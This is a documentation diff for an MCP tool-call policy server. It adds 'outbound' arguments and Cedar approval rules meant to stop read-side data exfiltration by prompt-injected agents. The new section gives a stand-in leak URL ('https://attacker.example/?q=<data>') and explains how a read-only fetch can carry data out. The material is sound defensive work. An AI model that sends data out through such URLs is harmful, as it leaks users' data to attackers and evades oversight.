@@ -22,15 +22,16 @@ Every call becomes one Cedar request.
 | `context.now_unix` | evaluation time, unix seconds |
 | `context.session` | output labels of the delegation run: `tainted` (bool) and `tainted_by` (set of `"<server>/<tool>"`); see [Asking for approval after untrusted output](#asking-for-approval-after-untrusted-output) |
 | `context.args_contain_untrusted`, `context.untrusted_args` | on a tainted run, for every call if some loaded policy reads either attribute and otherwise for a destructive call: whether an argument copies a value or span of an untrusted result of the run, and the names of those arguments (an argument pinned by an `equals` or `one_of` constraint never counts); `false` and an empty set otherwise. See [Asking only when an argument copies untrusted output](#asking-only-when-an-argument-copies-untrusted-output) |
+| `context.untrusted_outbound` | `true` when one of the arguments in `context.untrusted_args` is one the catalog marks `outbound`; see [Outbound arguments](#outbound-arguments) |
 | `context.approval` | `present` (bool) and `by` (`"user"`, `"operator"`, or `""` without an approval): whether this call carries a granted approval for its exact hash; see [Asking for approval after untrusted output](#asking-for-approval-after-untrusted-output) |
 | `context.budget` | what the token's run limits matching this call have left: `limited` (bool), `calls_remaining`, `amount_remaining` (Long; the largest Long when no such limit applies) and `destination_new` (bool); see [Run limits](#run-limits) |
-| `context.usage` | the delegation run's usage of this tool so far, for a destructive tool: `calls` (allowed calls by any hop), `amount` (the catalog's `amount` input summed over them) and `destination_seen` (bool); zero and false for other tools. `user_window.hour` and `user_window.day` (each `{calls, amount}`) are the same tool's usage by every run of the originating user in the current UTC hour and day. See [Limits over run usage](#limits-over-run-usage) and [Limits per user across runs](#limits-per-user-across-runs) |
+| `context.usage` | the delegation run's usage of this tool so far, for a destructive tool or one with an `outbound` input: `calls` (allowed calls by any hop), `amount` (the catalog's `amount` input summed over them) and `destination_seen` (bool); zero and false for other tools. `user_window.hour` and `user_window.day` (each `{calls, amount}`) are the same tool's usage by every run of the originating user in the current UTC hour and day. See [Limits over run usage](#limits-over-run-usage) and [Limits per user across runs](#limits-per-user-across-runs) |
 
 The action names the server as well as the tool. `action == Action::"github/read_file"` matches `read_file` on the upstream mounted as `github` and nothing else: a second upstream that also has a `read_file` tool (a malicious one, say) is not covered by that permit. To write a rule for every tool of one server, use the resource: `resource in Server::"github"`. To write one for every tool everywhere, leave `action` unconstrained or use `action in Action::"invoke"`.
 
 The principal is an `Agent`, and an agent is `in` the originating `User` and in every earlier agent of the chain. So `principal in User::"alice"` and `principal in Agent::"planner"` both work, the latter matching `planner` and anything it delegated to.
 
-`resource` carries `readonly`, `sensitive` and `destructive`, taken from the catalog (below). `principal.chain_depth` is the 1-based position of the agent in the chain.
+`resource` carries `readonly`, `sensitive`, `destructive` and `outbound`, taken from the catalog (below). `principal.chain_depth` is the 1-based position of the agent in the chain.
 
 Four things trip people up:
 
@@ -62,7 +63,7 @@ output = "trusted"
 
 It does three jobs:
 
-1. **Tool attributes** (`readonly`, `sensitive`, `destructive`) become `resource.readonly`, `resource.sensitive` and `resource.destructive`. `destructive` defaults to the opposite of `readonly`. `output` (`untrusted` by default, or `trusted`) says whether the tool's results taint the run; it is not a Cedar attribute. A tool that is not in the catalog is denied before Cedar runs, with reason `tool_not_in_catalog`, unless `[policy] unknown_tools` is `sensitive` (evaluated as `sensitive = true`) or `allow` (evaluated as neither, so a `forbid` keyed on `sensitive` silently skips it). Register every tool the server exposes (MCP `tools/list` is the natural source).
+1. **Tool attributes** (`readonly`, `sensitive`, `destructive`) become `resource.readonly`, `resource.sensitive` and `resource.destructive`. `destructive` defaults to the opposite of `readonly`. `outbound` names the arguments whose value is delivered to a party it names, and `resource.outbound` is true when it names any (see [Outbound arguments](#outbound-arguments)). `output` (`untrusted` by default, or `trusted`) says whether the tool's results taint the run; it is not a Cedar attribute. A tool that is not in the catalog is denied before Cedar runs, with reason `tool_not_in_catalog`, unless `[policy] unknown_tools` is `sensitive` (evaluated as `sensitive = true`) or `allow` (evaluated as neither, so a `forbid` keyed on `sensitive` silently skips it). Register every tool the server exposes (MCP `tools/list` is the natural source).
 2. **Schema generation.** Each catalog entry becomes a declared action, `Action::"<server>/<tool>"`, and each `inputs` entry a typed, optional attribute of `context.input`. Policies are validated against this schema at load time, so a typo in an argument name or a comparison of a string to a number fails the load instead of misbehaving on a call. A policy that names `Action::"github/x"` validates only if the catalog has a tool `x` under `github`. Argument types are `string`, `long`, `bool`, `decimal`, or `{ set = "string" }`. A `decimal` argument is Cedar's `decimal` type, for amounts with a fraction: `inputs = { amount = "decimal" }` and `context.input.amount.lessThan(decimal("100.0"))`. Cedar has no `<` on decimals, so use `lessThan`, `lessThanOrEqual`, `greaterThan` and `greaterThanOrEqual`.
 3. **Argument types on every call.** Evaluation itself is schema-free, so the types are also checked on each call, before Cedar: a present, non-null argument of another type than declared (a number where `repo` is a `string`, a single string where a set is declared, `2.5` for a `long`) is denied with reason `input_type_mismatch`, whether or not a policy reads it. Integral numbers, `5.0` included, count as `long`, as Cedar sees them. For a `decimal`, any number with at most 4 fractional digits counts, whole or not (`100` is `decimal("100.0")`); `12.34567`, a number beyond Cedar's range and a numeric string are refused. Nothing is coerced or rounded, except by the JSON parse itself: a number with more digits than a double holds (more than 15 significant digits) is the nearest double, which is also what the upstream is sent. Arguments the catalog declares no type for are not checked and reach Cedar as sent, and so do all arguments of a tool evaluated under `unknown_tools = "sensitive"` or `"allow"`. Before this check a mistyped argument that a policy read ended as `policy_error`, and one that no policy read went to the upstream.
 
@@ -312,6 +313,43 @@ when {
 ```
 
 The server keeps a window only for the kinds a loaded policy reads (the rule above keeps `day`, not `hour`); a kind it does not keep reads as zero. Starting a new run, or revoking one, does not reset a window. An injected agent that spends the window blocks the user's other runs until the window ends, so prefer the asking form, and use a plain `forbid` for a regulated cap that no approver may pass. If the window cannot be read, the policy sees the largest `Long` for both figures, so a count rule refuses or asks and an amount rule overflows and denies. Windows are exact only on one server process: see [deploying](deploying.md). [`config/policies/user-windows.cedar`](../../config/policies/user-windows.cedar) has an asking daily cap and a hard hourly count, with tests in `user-windows_test.yaml`.
+
+### Outbound arguments
+
+A read can leak. `get_webpage(url)` sends its URL to whatever host the URL names, so `https://attacker.example/?q=<data>` hands `<data>` to the attacker's server log, and the tool is still read-only as far as the user's own data goes. The catalog marks such an argument *outbound*:
+
+```toml
+[policy.catalog.web.fetch]
+readonly = true
+inputs = { url = "string" }
+outbound = "url#host"     # or a list: outbound = ["url", "callback#host"]
+```
+
+An outbound argument is a destination for run usage whatever `destructive` says, with `#host` counting hosts as `destination = "url#host"` does, so the new-site rule works on a fetch the catalog keeps read-only. `resource.outbound` is true for the tool, so one rule covers every such tool:
+
+```cedar
+// Once a run has fetched, a fetch from a host it has not fetched from asks.
+@id("ask_on_a_new_outbound_site")
+@obligation("approval")
+forbid (principal, action, resource)
+when {
+  resource.outbound &&
+  context.usage.calls >= 1 &&
+  !context.usage.destination_seen &&
+  !context.approval.present
+};
+```
+
+On a tainted run, an outbound argument that copies a value or span of an untrusted result also sets `context.untrusted_outbound`, so a rule can ask on outbound matches without naming arguments:
+
+```cedar
+@id("ask_on_untrusted_outbound")
+@obligation("approval")
+forbid (principal, action, resource)
+when { context.untrusted_outbound == true && !context.approval.present };
+```
+
+A matched search phrase or other argument that is not outbound leaves it `false`. When the span index cannot be read, or the call carries more than 8,000 fingerprints, every unpinned argument with a fingerprint counts as matched (`unreadable`), so an outbound one sets `context.untrusted_outbound` too. Both rules run under the usual approval flow (`-32008`, then the approved retry). The first rule leaves a run's first fetch free and depends on order: if the attacker's host is the first one fetched, it is not new. A tool with both `destination` and `outbound` keeps `destination` as it was and counts the outbound values next to it, and `destination_seen` is true when any of them was seen. The examples are in [`config/policies/run-usage.cedar`](../../config/policies/run-usage.cedar) and [`config/policies/output-labels.cedar`](../../config/policies/output-labels.cedar). The background is in the [read-side exfiltration design](../design/read-side-exfiltration.md).
 
 ### Chain depth
 
